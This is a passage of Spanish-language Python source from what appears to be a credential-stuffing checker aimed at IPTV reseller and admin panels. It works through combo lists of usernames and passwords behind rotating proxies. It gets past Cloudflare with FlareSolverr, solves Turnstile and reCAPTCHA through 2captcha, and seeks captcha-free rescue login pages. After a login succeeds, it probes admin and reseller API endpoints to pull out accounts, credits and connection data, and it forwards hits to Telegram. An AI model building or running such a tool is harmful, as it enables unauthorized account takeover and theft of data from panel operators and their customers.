                proxy_type = input(f"\n{Fore.GREEN}Seleccione tipo de proxy (1-3): {Style.RESET_ALL}")
                type_map = {
                    '1': self.proxy_manager.HTTP,
                    '2': self.proxy_manager.SOCKS4,
                    '3': self.proxy_manager.SOCKS5
                }

            if proxy_type not in type_map:
                print(f"{Fore.RED}Tipo de proxy inválido{Style.RESET_ALL}")
                return False

            print(f"\n{Fore.CYAN}🔄 Cargando y verificando proxies...{Style.RESET_ALL}")

            self.proxy_manager.loadProxiesFromFile(
                type_map[proxy_type],
                proxy_file
            )

            if self.proxy_manager.useProxies:
                print(f"{Fore.GREEN}✅ Proxies configurados exitosamente")
                print(f"📊 Total proxies válidos: {self.proxy_manager.totalProxies}")
                if hasattr(self.proxy_manager, 'proxy_auth_format'):
                    print(f"🔧 Formato: {'Autenticación' if self.proxy_manager.proxy_auth_format else 'Simple'}{Style.RESET_ALL}")
                return True
            else:
                print(f"{Fore.RED}❌ No se pudieron cargar proxies válidos{Style.RESET_ALL}")
                return False

        except Exception as e:
            logging.error(f"Error configurando proxies: {e}")
            print(f"{Fore.RED}Error configurando proxies: {str(e)}{Style.RESET_ALL}")
            return False

    def setup_directories(self):
        directories = ['Proxies', 'combos_paneles', 'hits_paneles', 'sound']
        for directory in directories:
            if not os.path.exists(directory):
                os.makedirs(directory)
                print(f"{Fore.GREEN}Creado directorio: {directory}{Style.RESET_ALL}")

    def display_banner(self):
        banner = self.create_banner()
        print(banner)

    def configure_user(self):
        print(f"\n{Fore.CYAN}Configuración de Usuario{Style.RESET_ALL}")

        config = configparser.ConfigParser()
        config_file = 'usuario.ini'

        if os.path.exists(config_file):
            try:
                config.read(config_file)
                if 'Usuario' in config:
                    self.hit_by= config['Usuario'].get('usuario')

                    if self.hit_by:
                        print(f"{Fore.GREEN}Configuración de Usuario cargada desde {config_file}{Style.RESET_ALL}")
                        self.usuario_enabled= True
                        return
            except Exception as e:
                logging.error(f"Error leyendo configuración: {e}")

        usuario = self.get_valid_input(
            f"{Fore.GREEN}Nombre de usuario: {Style.RESET_ALL}",
            input_type="text"
        )

        if usuario:
            try:
                        print(f"{Fore.GREEN}Configuración de Usuario exitosa!{Style.RESET_ALL}")
                        self.hit_by = usuario
                        if not config.has_section('Usuario'):
                            config.add_section('Usuario')
                            config['Usuario']['usuario'] = usuario

                            with open(config_file, 'w') as f:
                                config.write(f)

                            print(f"{Fore.GREEN}Configuración guardada en {config_file}{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}Error en la configuración de Usuario{Style.RESET_ALL}")
                            self.usuario_enabled = False

            except Exception as e:
                    print(f"{Fore.RED}Error configurando Datos de Usuario {str(e)}{Style.RESET_ALL}")
                    self.usuario_enabled = False
        else:
                print(f"{Fore.RED}Nombre de usuario requerido{Style.RESET_ALL}")
                self.usuario_enabled = False                                                                     

    def configure_telegram(self):
        print(f"\n{Fore.CYAN}Configuración de Telegram{Style.RESET_ALL}")

        config = configparser.ConfigParser()
        config_file = 'config.ini'

        if os.path.exists(config_file):
            try:
                config.read(config_file)
                if 'Telegram' in config:
                    self.telegram_token = config['Telegram'].get('token')
                    self.telegram_chat_id = config['Telegram'].get('chat_id')

                    if self.telegram_token and self.telegram_chat_id:
                        print(f"{Fore.GREEN}Configuración de Telegram cargada desde {config_file}{Style.RESET_ALL}")
                        self.telegram_enabled = True
                        return
            except Exception as e:
                logging.error(f"Error leyendo configuración: {e}")

        choice = self.get_valid_input(
            f"{Fore.GREEN}¿Desea enviar los hits a Telegram? (s/n): {Style.RESET_ALL}",
            input_type="choice",
            valid_options=['s', 'n']
        )
        self.telegram_enabled = (choice == 's')

        if self.telegram_enabled:
            token = self.get_valid_input(
                f"{Fore.GREEN}Ingrese el token del bot de Telegram: {Style.RESET_ALL}",
                input_type="text"
            )
            chat_id = self.get_valid_input(
                f"{Fore.GREEN}Ingrese el chat ID: {Style.RESET_ALL}",
                input_type="text"
            )

            if token and chat_id:
                try:
                    url = f"https://api.telegram.org/bot{token}/sendMessage"
                    test_message = "🔹 Test de configuración exitoso\n🔹 Panel Scanner está correctamente configurado"

                    response = requests.post(
                        url,
                        json={
                            "chat_id": chat_id,
                            "text": test_message
                        },
                        verify=False,
                        timeout=10
                    )

                    if response.status_code == 200:
                        print(f"{Fore.GREEN}Configuración de Telegram exitosa!{Style.RESET_ALL}")
                        self.telegram_token = token
                        self.telegram_chat_id = chat_id

                        if not config.has_section('Telegram'):
                            config.add_section('Telegram')
                        config['Telegram']['token'] = token
                        config['Telegram']['chat_id'] = chat_id

                        with open(config_file, 'w') as f:
                            config.write(f)

                        print(f"{Fore.GREEN}Configuración guardada en {config_file}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}Error en la configuración de Telegram{Style.RESET_ALL}")
                        self.telegram_enabled = False

                except Exception as e:
                    print(f"{Fore.RED}Error configurando Telegram: {str(e)}{Style.RESET_ALL}")
                    self.telegram_enabled = False
            else:
                print(f"{Fore.RED}Token y Chat ID son requeridos{Style.RESET_ALL}")
                self.telegram_enabled = False

    def select_combo_file(self):
        files = os.listdir('combos_paneles')
        if not files:
            print(f"{Fore.RED}No se encontraron archivos de combos{Style.RESET_ALL}")
            return None

        print(f"\n{Fore.CYAN}Archivos de combos disponibles:{Style.RESET_ALL}")
        for i, file in enumerate(files, 1):
            print(f"{Fore.YELLOW}[{i}] {file}{Style.RESET_ALL}")

        while True:
            try:
                choice = self.get_valid_input(
                    f"\n{Fore.GREEN}Seleccione número de archivo: {Style.RESET_ALL}",
                    input_type="int",
                    min_val=1,
                    max_val=len(files)
                )
                if choice is not None:
                    return os.path.join('combos_paneles', files[choice-1])
                return None
            except ValueError:
                pass
            print(f"{Fore.RED}Selección inválida{Style.RESET_ALL}")

    def check_rescue_url(self, original_url):
        """Verifica si existe URL rescue funcional"""
        try:
            parsed = urlparse(original_url)
            rescue_url = f"{parsed.scheme}://{parsed.netloc}/rescue/login"

            logging.info(f"Verificando URL rescue: {rescue_url}")

            proxy = None
            if self.proxy_manager.useProxies:
                proxy, _ = self.proxy_manager.getProxy()

            response = self.make_request('get', rescue_url, timeout=10, proxy=proxy)
            if response and response.status_code == 200:
                has_captcha = self.detect_recaptcha(response.text)
                if not has_captcha:
                    logging.info(f"URL rescue válida encontrada: {rescue_url}")
                    return rescue_url
                else:
                    logging.warning(f"URL rescue también tiene reCAPTCHA")

            logging.warning(f"URL rescue no disponible o inválida")
            return None
        except Exception as e:
            logging.error(f"Error verificando URL rescue: {str(e)}")
            return None

    def validate_url_with_rescue_logic(self):
        """Lógica principal para manejo de URLs con rescue"""
        print(f"\n{Fore.CYAN}Verificando servidor y detectando reCAPTCHA...{Style.RESET_ALL}")

        try:

            proxy = None
            if self.proxy_manager.useProxies:
                proxy, proxy_index = self.proxy_manager.getProxy()
                if proxy:

                    proxy_str = str(proxy.get('http', 'N/A'))
                    if '@' in proxy_str:

                        parts = proxy_str.split('@')
                        proxy_display = f"{parts[0].split('://')[0]}://***:***@{parts[1]}"
                    else:
                        proxy_display = proxy_str
                    print(f"{Fore.CYAN}🔧 Usando proxy #{proxy_index}: {proxy_display}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}⚠️ No se pudo obtener proxy del pool{Style.RESET_ALL}")

            original_response = self.make_request('get', self.server_url, timeout=30, proxy=proxy)

            if not original_response:
                print(f"{Fore.YELLOW}💡 Proxy falló, intentando con otro...{Style.RESET_ALL}")

                for retry in range(2):
                    if self.proxy_manager.useProxies:
                        proxy, proxy_index = self.proxy_manager.getProxy()
                        if proxy:
                            proxy_str = str(proxy.get('http', 'N/A'))
                            if '@' in proxy_str:
                                parts = proxy_str.split('@')
                                proxy_display = f"{parts[0].split('://')[0]}://***:***@{parts[1]}"
                            else:
                                proxy_display = proxy_str
                            print(f"{Fore.CYAN}🔧 Reintentando con proxy #{proxy_index}: {proxy_display}{Style.RESET_ALL}")
                            original_response = self.make_request('get', self.server_url, timeout=30, proxy=proxy)
                            if original_response:
                                break

            if original_response and original_response.status_code in [403, 503, 429, 521, 522, 523, 524, 525, 526]:
                print(f"{Fore.YELLOW}🛡️ Código {original_response.status_code} detectado - posible Cloudflare{Style.RESET_ALL}")
                print(f"{Fore.CYAN}🔧 Intentando resolver con FlareSolverr...{Style.RESET_ALL}")

                try:

                    flaresolverr = FlareSolverrHandler(verbose=True)
                    if flaresolverr.available:
                        solution = flaresolverr.solve_cloudflare(self.server_url)
                        if solution and solution.get('success'):
                            print(f"{Fore.GREEN}✅ Cloudflare resuelto con FlareSolverr{Style.RESET_ALL}")

                            class FakeResponse:
                                def __init__(self, text, status_code, url):
                                    self.text = text
                                    self.status_code = status_code
                                    self.url = url
                            original_response = FakeResponse(solution['html'], solution['status_code'], self.server_url)
                        else:
                            print(f"{Fore.RED}❌ FlareSolverr no pudo resolver{Style.RESET_ALL}")
                            print(f"{Fore.YELLOW}💡 El sistema intentará usar FlareSolverr en cada login{Style.RESET_ALL}")
                            return self.server_url, False, None
                    else:
                        print(f"{Fore.YELLOW}⚠️ FlareSolverr no disponible{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}💡 El sistema intentará acceder sin validación previa{Style.RESET_ALL}")
                        return self.server_url, False, None
                except Exception as e:
                    print(f"{Fore.YELLOW}⚠️ Error con FlareSolverr: {str(e)}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}💡 El sistema continuará sin validación previa{Style.RESET_ALL}")
                    return self.server_url, False, None

            if not original_response:
                print(f"{Fore.YELLOW}⚠️ Proxies no funcionaron - intentando acceso directo con FlareSolverr...{Style.RESET_ALL}")
                try:
                    flaresolverr = FlareSolverrHandler(verbose=True)
                    if flaresolverr.available:
                        solution = flaresolverr.solve_cloudflare(self.server_url)
                        if solution and solution.get('success'):
                            print(f"{Fore.GREEN}✅ Acceso exitoso con FlareSolverr{Style.RESET_ALL}")

                            class FakeResponse:
                                def __init__(self, text, status_code, url):
                                    self.text = text
                                    self.status_code = status_code
                                    self.url = url
                            original_response = FakeResponse(solution['html'], solution['status_code'], self.server_url)
                        else:
                            print(f"{Fore.RED}❌ FlareSolverr no pudo acceder{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.YELLOW}⚠️ FlareSolverr no disponible{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.YELLOW}⚠️ Error con FlareSolverr: {str(e)}{Style.RESET_ALL}")

            elif not original_response or original_response.status_code != 200:
                print(f"{Fore.RED}❌ No se pudo acceder al servidor (código: {original_response.status_code if original_response else 'sin respuesta'}){Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 Esto puede ser normal si el servidor requiere proxies{Style.RESET_ALL}")
                return None, False, None

            has_turnstile = self.detect_turnstile(original_response.text)
            has_recaptcha = self.detect_recaptcha(original_response.text)

            if not has_turnstile and not has_recaptcha:
                print(f"{Fore.GREEN}✅ Servidor accesible sin captcha{Style.RESET_ALL}")
                return self.server_url, False, None

            if has_turnstile:
                print(f"{Fore.YELLOW}🛡️ Cloudflare Turnstile detectado en servidor{Style.RESET_ALL}")

                if has_turnstile and isinstance(has_turnstile, str):
                    print(f"{Fore.CYAN}🤖 Intentando resolver Turnstile con 2captcha...{Style.RESET_ALL}")

                    if self.solver:
                        try:
                            balance = self.solver.balance()
                            print(f"{Fore.CYAN}💰 Balance 2captcha: ${balance}{Style.RESET_ALL}")

                            if float(balance) >= 0.01:
                                turnstile_token = self.solve_turnstile(has_turnstile, self.server_url)

                                if turnstile_token:
                                    print(f"{Fore.GREEN}✅ Turnstile resuelto, servidor accesible{Style.RESET_ALL}")
                                    return self.server_url, False, None
                                else:
                                    print(f"{Fore.YELLOW}⚠️ No se pudo resolver Turnstile automáticamente{Style.RESET_ALL}")
                                    print(f"{Fore.YELLOW}💡 El sistema intentará resolverlo en cada login{Style.RESET_ALL}")
                                    return self.server_url, False, None
                            else:
                                print(f"{Fore.YELLOW}⚠️ Balance insuficiente para resolver Turnstile{Style.RESET_ALL}")
                                print(f"{Fore.YELLOW}💡 El servidor tiene Turnstile, puede que necesites más saldo{Style.RESET_ALL}")
                                return None, False, None
                        except Exception as e:
                            print(f"{Fore.YELLOW}⚠️ Error verificando balance: {str(e)}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}❌ 2captcha no está configurado para resolver Turnstile{Style.RESET_ALL}")
                        return None, False, None
                else:

                    print(f"{Fore.YELLOW}💡 Turnstile detectado, se intentará resolver en cada login{Style.RESET_ALL}")
                    return self.server_url, False, None

            if has_recaptcha:
                print(f"{Fore.YELLOW}🤖 reCAPTCHA detectado en servidor{Style.RESET_ALL}")

            print(f"{Fore.YELLOW}🛡️ reCAPTCHA detectado en URL original{Style.RESET_ALL}")

            rescue_url = self.check_rescue_url(self.server_url)

            if rescue_url:
                print(f"{Fore.GREEN}✅ URL rescue encontrada y funcional: {rescue_url}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}📋 Estrategia: Escanear con rescue, verificar custom/hits con URL original{Style.RESET_ALL}")
                print(f"{Fore.CYAN}💡 Los custom de rescue se verificarán en URL original{Style.RESET_ALL}")
                return rescue_url, True, self.server_url
            else:
                print(f"{Fore.YELLOW}⚠️ El servidor tiene reCAPTCHA y no soporta URL rescue{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💰 Esto requerirá resolver captcha para cada intento{Style.RESET_ALL}")

                while True:
                    choice = self.get_valid_input(
                        f"\n{Fore.GREEN}¿Deseas continuar de todos modos? (s/n): {Style.RESET_ALL}",
                        input_type="choice",
                        valid_options=['s', 'n']
                    )

                    if choice == 's':
                        print(f"{Fore.YELLOW}⚠️ Continuando con reCAPTCHA{Style.RESET_ALL}")
                        return self.server_url, False, None
                    elif choice == 'n':
                        print(f"{Fore.RED}❌ Escaneo cancelado por el usuario{Style.RESET_ALL}")
                        return None, False, None
                    else:
                        print(f"{Fore.RED}Por favor responde 's' o 'n'{Style.RESET_ALL}")

        except Exception as e:
            logging.error(f"Error en validación con rescue: {str(e)}")
            print(f"{Fore.RED}❌ Error validando servidor: {str(e)}{Style.RESET_ALL}")
            return None, False, None

    def validate_single_url(self):
        """Validación con soporte completo para rescue"""
        print(f"\n{Fore.YELLOW}Ejemplo: http://servidor.com:puerto/login.php{Style.RESET_ALL}")

        while True:
            url = self.get_valid_input(
                f"{Fore.GREEN}URL del servidor: {Style.RESET_ALL}",
                input_type="url"
            )
            if not url:
                return None

            try:
                parsed = urlparse(url)
                if not all([parsed.scheme, parsed.netloc]):
                    raise ValueError("URL mal formada")

                self.server_url = url
                final_url, use_rescue, original_url = self.validate_url_with_rescue_logic()

                if final_url is None:

                    if not self.proxy_manager.useProxies:
                        use_proxies = self.get_valid_input(
                            f"\n{Fore.YELLOW}¿Desea reintentar con proxies? (s/n): {Style.RESET_ALL}",
                            input_type="choice",
                            valid_options=['s', 'n']
                        )

                        if use_proxies == 's':
                            print(f"{Fore.CYAN}Configurando proxies...{Style.RESET_ALL}")
                            if self.configure_proxies():
                                print(f"{Fore.GREEN}✅ Proxies configurados, reintentando conexión...{Style.RESET_ALL}")

                                final_url, use_rescue, original_url = self.validate_url_with_rescue_logic()

                                if final_url is not None:

                                    if use_rescue:
                                        self.use_rescue_strategy = True
                                        self.original_url = original_url
                                        print(f"{Fore.CYAN}🔧 Configuración final:")
                                        print(f"   • URL escaneo: {final_url}")
                                        print(f"   • URL verificación: {original_url}")
                                        print(f"   • Estrategia: Rescue{Style.RESET_ALL}")
                                    else:
                                        self.use_rescue_strategy = False
                                        self.original_url = None
                                        print(f"{Fore.CYAN}🔧 Configuración final:")
                                        print(f"   • URL: {final_url}")
                                        print(f"   • Custom se verificarán en: {self.original_url}")
                                        print(f"   • Estrategia: Normal{Style.RESET_ALL}")

                                    return final_url

                    retry = self.get_valid_input(
                        f"\n{Fore.YELLOW}¿Desea intentar con otra URL? (s/n): {Style.RESET_ALL}",
                        input_type="choice",
                        valid_options=['s', 'n']
                    )
                    if retry != 's':
                        return None
                    continue

                self.server_url = final_url
                self.use_rescue_strategy = use_rescue
                self.original_url = original_url if original_url else final_url

                if use_rescue:
                    print(f"{Fore.CYAN}🔧 Configuración final:")
                    print(f"   • URL de escaneo (rescue): {final_url}")
                    print(f"   • URL para verificar custom/hits: {self.original_url}")
                    print(f"   • Estrategia: Rescue + verificación en URL original{Style.RESET_ALL}")
                else:
                    print(f"{Fore.CYAN}🔧 Configuración final:")
                    print(f"   • URL: {final_url}")
                    print(f"   • Custom se verificarán en: {self.original_url}")
                    print(f"   • Estrategia: Normal{Style.RESET_ALL}")

                return final_url

            except Exception as e:
                print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
                retry = self.get_valid_input(
                    f"\n{Fore.YELLOW}¿Desea intentar con otra URL? (s/n): {Style.RESET_ALL}",
                    input_type="choice",
                    valid_options=['s', 'n']
                )
                if retry != 's':
                    return None

    def update_display(self):
        try:
            print('\033[?25l', end='')

            while not self.scanning_complete:
                if self.start_time:
                    try:
                        self.update_progress()
                        time_ = time.localtime()
                        current_time = time.strftime("%Y-%m-%d -- %H:%M:%S", time_)
                        self.current_time = current_time
                        elapsed = time.time() - self.start_time
                        output = []
                        output.append('\033[2J\033[H')
                        output.append(self.create_banner())
                        scan_by= f"{Fore.GREEN}Scan by: {Fore.YELLOW}{self.hit_by}{Fore.RESET}"

                        output.append(f"{Fore.YELLOW}{current_time:^60}")
                        output.append(f"{scan_by}")                        
                        output.append(f"{Fore.CYAN}{'—' * self.terminal_width}")

                        if hasattr(self, 'use_rescue_strategy') and self.use_rescue_strategy:
                            output.append(f"Server: {Fore.YELLOW}{self.original_url}{Style.RESET_ALL}")
                        else:
                            output.append(f"Server: {Fore.YELLOW}{self.server_url}{Style.RESET_ALL}")
                            if hasattr(self, 'current_server') and self.current_server != self.server_url:
                                output.append(f"Current: {Fore.CYAN}{self.current_server}{Style.RESET_ALL}")

                        output.append(f"Combo: {Fore.YELLOW}{self.combo_en_uso}{Style.RESET_ALL}")                                                                          

                        current_combo = getattr(self, 'current_combo', None)
                        if current_combo:

                            if ':' in current_combo:
                                username, password = current_combo.split(':', 1)

                                masked_pass = password[:3] + '*' * min(5, len(password) - 3) if len(password) > 3 else '***'
                                combo_display = f"{Fore.CYAN}{username}:{masked_pass}{Style.RESET_ALL}"
                            else:
                                combo_display = f"{Fore.CYAN}{current_combo}{Style.RESET_ALL}"
                            output.append(f"Checking: {combo_display}")
                        else:
                            output.append(f"Checking: {Fore.YELLOW}Esperando próximo combo...{Style.RESET_ALL}")

                        if self.proxy_manager and self.proxy_manager.useProxies:
                            current_proxy, _ = self.proxy_manager.getProxy()
                            if current_proxy:
                                proxy_display = self.format_proxy_for_display(current_proxy)
                                output.append(f"Proxy: {Fore.MAGENTA}{proxy_display}{Style.RESET_ALL}")
                            else:
                                output.append(f"Proxy: {Fore.RED}No disponible{Style.RESET_ALL}")

                        output.append(f"\nProgress: {self.create_progress_bar()}")
                        output.append(
                            f"Checked: {Fore.YELLOW}{self.stats['checked']}/{self.stats['total']}"
                            f" ({self.progress_percentage:.1f}%){Style.RESET_ALL}"
                        )
                        output.append(f"Time: {Fore.YELLOW}{self.format_time(int(elapsed))}")
                        output.append(f"CPM: {Fore.YELLOW}{self.cpm}")

                        stats_line = (
                            f"\n{Fore.GREEN}Hits: {self.hit} {Style.RESET_ALL}| "
                            f"{Fore.RED}Fails: {self.fail} {Style.RESET_ALL}| "
                            f"{Fore.MAGENTA}Custom: {self.custom} {Style.RESET_ALL}| "
                            f"{Fore.YELLOW}Retries: {self.retries} {Style.RESET_ALL}| "
                            f"Bots: {self.active_threads}"
                        )
                        output.append(stats_line)

                        if self.retry_accounts:
                            output.append(f"\n{Fore.CYAN}Retries pendientes: {len(self.retry_accounts)}{Style.RESET_ALL}")

                            if self.show_retries:
                                output.append(f"{Fore.CYAN}Cuentas en Retry:{Style.RESET_ALL}")
                                retry_items = list(self.retry_accounts.items())[:5]  
                                for combo, attempts in retry_items:
                                    short_combo = combo[:30] + "..." if len(combo) > 30 else combo
                                    output.append(f"{Fore.YELLOW}{short_combo} - Intentos: {attempts}/3{Style.RESET_ALL}")
                                if len(self.retry_accounts) > 5:
                                    output.append(f"{Fore.YELLOW}... y {len(self.retry_accounts) - 5} más{Style.RESET_ALL}")
                                output.append(f"\n{Fore.GREEN}Presione 'R' para ocultar retries{Style.RESET_ALL}")
                            else:
                                output.append(f"{Fore.GREEN}Presione 'R' para mostrar retries{Style.RESET_ALL}")

                        if self.hit > 0 and not self.successful_results.empty():
                            hits_list = list(self.successful_results.queue)

                            if len(hits_list) > 1:
                                output.append(f"\n{Fore.CYAN}Hits Anteriores:{Style.RESET_ALL}")
                                for hit_info in hits_list[:-1]:
                                    user = hit_info['message'].split('Username:')[1].split('\n')[0].strip()
                                    password = hit_info['message'].split('Password:')[1].split('\n')[0].strip()
                                    url = hit_info['url']
                                    output.append(f"{Fore.GREEN}HIT: {user}:{password} -> {url}{Style.RESET_ALL}")
                            output.append(f"\n{Fore.CYAN}Último Hit:{Style.RESET_ALL}")
                            last_hit = hits_list[-1]
                            output.append(last_hit['message'])

                            if 'accounts' in last_hit and last_hit['accounts']:
                                output.append("\nCuentas encontradas:")
                                output.append(self.create_accounts_table(last_hit['accounts']))

                        if self.hit > 0:
                            with self.tracking_lock:

                                if self.reseller_hits:
                                    output.append(f"\n{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
                                    output.append(f"{Fore.YELLOW}📊 ÚLTIMOS 5 HITS DE RESELLERS{Style.RESET_ALL}")
                                    output.append(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}")

                                    recent_hits = self.reseller_hits[-5:][::-1]

                                    try:
                                        from tabulate import tabulate
                                        from urllib.parse import urlparse
                                        table_data = []
                                        for i, hit in enumerate(recent_hits, 1):

                                            try:
                                                parsed_url = urlparse(hit.get('host', ''))
                                                server_host = parsed_url.netloc or hit.get('host', 'N/D')
                                            except:
                                                server_host = hit.get('host', 'N/D')

                                            table_data.append([
                                                i,
                                                server_host[:25],
                                                hit['username'][:15],
                                                hit['panel_type'],
                                                hit.get('credits', 'N/D')[:8],
                                                hit.get('active_accounts', 'N/D')[:8],
                                                hit.get('open_connections', 'N/D')[:8],
                                                hit.get('online_users', 'N/D')[:8]
                                            ])
                                        headers = ["#", "Servidor", "Usuario", "Panel", "Créd", "Cuentas", "Conex", "Online"]
                                        table_str = tabulate(table_data, headers=headers, tablefmt="grid")
                                        output.append(table_str)
                                    except:

                                        for i, hit in enumerate(recent_hits, 1):
                                            output.append(f"{i}. {hit.get('host', 'N/D')[:30]} | {hit['username']} | {hit['panel_type']} | Cred: {hit.get('credits', 'N/D')} | Cuentas: {hit.get('active_accounts', 'N/D')}")

                                    output.append(f"{Fore.GREEN}📈 Total hits: {len(self.reseller_hits)}{Style.RESET_ALL}")

                                if self.extracted_accounts:
                                    output.append(f"\n{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
                                    output.append(f"{Fore.YELLOW}👥 ÚLTIMAS 10 CUENTAS EXTRAÍDAS (Total: {len(self.extracted_accounts)}){Style.RESET_ALL}")
                                    output.append(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}")

                                    recent_accounts = self.extracted_accounts[-10:][::-1]

                                    try:
                                        from tabulate import tabulate
                                        table_data = []
                                        for i, account in enumerate(recent_accounts, 1):
                                            connections = f"{account['active_cons']}/{account['max_cons']}"
                                            table_data.append([
                                                i,
                                                account['reseller'][:15],
                                                account['username'][:20],
                                                account['expires'][:15],
                                                account['status'][:10],
                                                connections
                                            ])
                                        headers = ["#", "Reseller", "Usuario", "Expira", "Estado", "Con/Max"]
                                        table_str = tabulate(table_data, headers=headers, tablefmt="grid")
                                        output.append(table_str)
                                    except:

                                        for i, account in enumerate(recent_accounts, 1):
                                            output.append(f"{i}. {account['username']} | {account['status']} | {account['expires']}")

                                    output.append(f"{Fore.GREEN}📈 Total cuentas: {len(self.extracted_accounts)}{Style.RESET_ALL}")

                        new_display = '\n'.join(output)
                        if new_display != self.last_display:
                            print(new_display, flush=True)
                            self.last_display = new_display

                    except Exception as e:
                        logging.error(f"Error updating display: {str(e)}")

                    time.sleep(0.2)

        finally:
            print('\033[?25h', end='')

    def buscarj(self, s, first, last):
        try:
            start = s.index(first) + len(first)
            end = s.index(last, start)
            return s[start:end]
        except ValueError:
            return ''

    def handle_dazplayer_server(self, url, username, password):
        """Manejo específico para servidores tipo DazPlayer con respuestas JSON"""

        if not any(indicator in url.lower() for indicator in ['dazplayer', 'json']):
            return None

        logging.info(f"🎯 Servidor DazPlayer detectado - usando método específico")

        try:

            session = requests.Session()
            session.verify = False

            if self.proxy_manager and self.proxy_manager.useProxies:
                proxy, _ = self.proxy_manager.getProxy()
                if proxy:
                    session.proxies = proxy

            headers = {
                'User-Agent': 'Mozilla/5.0 (compatible; Destroyer/1.0)',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded'
            }

            response = session.get(url, headers=headers, timeout=15)
            cookies = {cookie.name: cookie.value for cookie in response.cookies}

            login_data = {
                'username': username,
                'password': password,
                'login': '',
                'referrer': ''
            }

            login_response = session.post(
                url,
                data=login_data,
                headers=headers,
                cookies=cookies,
                timeout=15,
                allow_redirects=False  
            )

            if login_response.text.strip().startswith('{'):
                try:
                    json_data = json.loads(login_response.text)
                    if json_data.get('status') == 'success':
                        logging.info(f"✅ DazPlayer login exitoso: {json_data}")
                        return login_response
                    else:
                        logging.info(f"❌ DazPlayer login falló: {json_data}")
                        return None
                except json.JSONDecodeError:
                    pass

            return login_response

        except Exception as e:
            logging.error(f"Error en manejo DazPlayer: {str(e)}")
            return None

    def process_successful_login(self, response, username, password, session_id, current_url):
        """Procesa login exitoso - VERSIÓN MEJORADA PARA JSON"""
        try:
            logging.info(f"Procesando login exitoso para {username}")

            redirect_url = None
            if response.text.strip().startswith('{'):
                try:
                    json_data = json.loads(response.text)
                    if json_data.get('status') == 'success':
                        message = json_data.get('message', '')
                        if message:

                            if message.startswith('./'):
                                redirect_url = f"{'/'.join(current_url.split('/')[:-1])}/{message[2:]}"
                            elif message.startswith('/'):
                                parsed_current = urlparse(current_url)
                                redirect_url = f"{parsed_current.scheme}://{parsed_current.netloc}{message}"
                            elif not message.startswith('http'):
                                redirect_url = f"{'/'.join(current_url.split('/')[:-1])}/{message}"
                            else:
                                redirect_url = message

                            logging.info(f"🔄 JSON redirección detectada: {redirect_url}")

                            try:
                                panel_response = self.make_request(
                                    'get', redirect_url,
                                    cookies={'PHPSESSID': session_id},
                                    timeout=10
                                )

                                if panel_response and panel_response.status_code == 200:
                                    logging.info(f"✅ Panel obtenido via JSON redirect: {len(panel_response.text)} chars")
                                    response = panel_response  
                                    current_url = redirect_url  
                                else:
                                    logging.warning("❌ No se pudo acceder al panel via redirect JSON")
                            except Exception as e:
                                logging.error(f"Error accediendo a redirect JSON: {str(e)}")
                except json.JSONDecodeError:
                    pass  

            headers = {
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': 'application/json, text/javascript, */*; q=0.01'
            }
            base_url = '/'.join(current_url.split('/')[:-1])

            if 'reseller.php' in response.url or (redirect_url and 'reseller.php' in redirect_url):
                panel_type = 'XC'
                base_url = response.url.replace("reseller.php","") if 'reseller.php' in response.url else base_url
                self.panel_type = 'XC'
            else:
                panel_type = 'XUI'
                base_url = '/'.join(current_url.split('/')[:-1]) + '/'
                self.panel_type = 'XUI'

            is_admin = False
            admin_indicators = [
                'administrator', 'admin panel', 'admin dashboard',
                'system settings', 'manage_servers', 'manage reseller',
                'add reseller', 'bouquets', 'categories', 'manage_reseller'
            ]

            for indicator in admin_indicators:
                if indicator in response.text.lower():
                    is_admin = True
                    logging.info(f"Detectado panel de administración por indicador: {indicator}")
                    break

            logging.info(f"Panel tipo: {panel_type}, Base URL: {base_url}, Admin: {is_admin}")

            cookies = {'PHPSESSID': session_id, 'theme': '0'}

            data = None
            data_json = None

            if is_admin:
                admin_endpoints = []

                if panel_type == "XUI":
                    admin_endpoints = [
                        (f"{base_url}api?action=dashboard", headers),
                        (f"{base_url}dashboard", {}),
                        (f"{base_url}admin_dashboard", {}),
                        (f"{base_url}api/admin", headers),
                        (f"{base_url}api/stats", headers),
                        (f"{base_url}api/resellers", headers)
                    ]
                elif panel_type == 'XC':
                    admin_endpoints = [
                        (f"{base_url}/api.php?action=admin_dashboard", {}),
                        (f"{base_url}/api?action=admin_dashboard", {}),
                        (f"{base_url}/api.php?action=system_stats", {}),
                        (f"{base_url}/admin_dashboard.php", {})
                    ]

                for api_url, extra_headers in admin_endpoints:
                    req_headers = headers.copy()
                    req_headers.update(extra_headers)

                    logging.info(f"Intentando obtener datos de admin desde: {api_url}")
                    api_response = self.make_request('get', api_url, cookies=cookies, headers=req_headers)

                    if api_response and api_response.status_code == 200:
                        try:
                            temp_data = api_response.json()
                            if temp_data:
                                data_json = temp_data
                                data = api_response
                                logging.info(f"Datos JSON de admin obtenidos desde {api_url}")
                                break
                        except:
                            if 'dashboard' in api_url and len(api_response.text) > 500:
                                data = api_response
                                logging.info(f"Datos HTML de admin obtenidos desde {api_url}")
                                break

                reseller_data = None
                reseller_endpoints = []
                if panel_type == "XUI":
                    reseller_endpoints = [
                        (f"{base_url}api?action=get_resellers", headers),
                        (f"{base_url}api/resellers", headers),
                        (f"{base_url}resellers", {})
                    ]
                elif panel_type == 'XC':
                    reseller_endpoints = [
                        (f"{base_url}/api.php?action=get_resellers", {}),
                        (f"{base_url}/api?action=get_resellers", {}),
                        (f"{base_url}/resellers.php", {})
                    ]

                for api_url, extra_headers in reseller_endpoints:
                    req_headers = headers.copy()
                    req_headers.update(extra_headers)

                    logging.info(f"Intentando obtener datos de resellers desde: {api_url}")
